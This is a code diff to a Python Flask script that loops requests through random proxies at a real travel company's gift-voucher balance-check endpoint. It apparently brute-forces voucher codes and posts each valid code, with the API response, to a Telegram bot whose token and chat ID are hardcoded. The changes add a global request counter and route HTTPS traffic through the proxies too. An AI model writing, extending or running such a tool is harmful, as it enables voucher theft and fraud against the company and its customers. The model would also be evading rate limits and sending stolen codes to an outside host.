@@ -8,6 +8,9 @@ import time
 
 app = Flask(__name__)
 
+# Global variable to track the number of requests
+request_count = 0
+
 # Helper function to generate random email
 def generate_random_email():
     email_prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
@@ -36,6 +39,8 @@ def load_proxies():
 
 # API request function
 def send_api_request(proxy):
+    global request_count  # Access the global variable to increment the request count
+
     # Define the URL and payload
     url = "https://secure.yatra.com/PaySwift/gift-voucher/yatra/dom2/1611240003969/check-balance"
 
@@ -75,7 +80,8 @@ def send_api_request(proxy):
 
     # Define proxy
     proxies = {
-        'http': proxy
+        'http': proxy,
+        'https': proxy
     }
 
     # Send API request with proxy
@@ -91,15 +97,16 @@ def send_api_request(proxy):
         success_message = f"CODE : {payload['vouchers'][0]['code']}\n\nAPI Response:\n{json.dumps(response_data, indent=4)}"
         send_telegram_message("https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-680337101", success_message)
 
+    # Increment the request count after sending each request
+    request_count += 1
+
 # Function to run the request in an infinite loop
 def run_infinite_loop():
     proxies = load_proxies()  # Load proxies from the file
-    request_count = 0
     while True:
         try:
             proxy = random.choice(proxies)  # Pick a random proxy from the list
             send_api_request(proxy)
-            request_count += 1
             time.sleep(5)  # Wait for 5 seconds before sending the next request
         except Exception as e:
             print(f"Error in sending request: {e}")
